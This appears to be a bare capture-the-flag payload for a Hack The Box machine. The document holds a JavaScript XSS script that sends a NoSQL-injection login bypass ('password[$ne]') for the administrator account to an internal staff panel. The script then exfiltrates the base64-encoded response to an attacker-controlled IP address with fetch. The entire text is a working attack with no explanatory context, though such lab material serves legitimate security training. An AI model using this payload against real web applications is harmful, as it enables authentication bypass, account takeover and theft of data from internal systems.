http://staff-review-panel.mailroom.htb/auth.php?token=

<script>
x=new XMLHttpRequest();
x.open('POST','http://staff-review-panel.mailroom.htb/auth.php');
x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
x.onload=function(){
    fetch('http://10.10.16.180:4443/'+btoa(this.responseText));
};
x.send('email=administrator@mailroom.htb&password[$ne]=admin');
</script>